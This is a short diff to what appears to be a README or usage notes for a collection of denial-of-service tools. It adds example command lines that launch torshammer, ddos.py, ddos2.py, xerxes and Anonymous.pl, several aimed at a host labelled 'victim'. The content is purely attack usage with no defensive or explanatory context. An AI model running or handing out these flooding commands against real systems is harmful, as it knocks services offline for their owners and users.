@@ -14,5 +14,8 @@
 
 #example run
 python hammer.py -s ip -r packet -p port
-python torshammer.py -t ip -p port 
-
+python torshammer.py -t ip -p port -r threads
+python2 ddos.py hostname victim
+python2 ddos2.py hostname victim
+./xerxes hostname victim
+perl Anonymous.pl
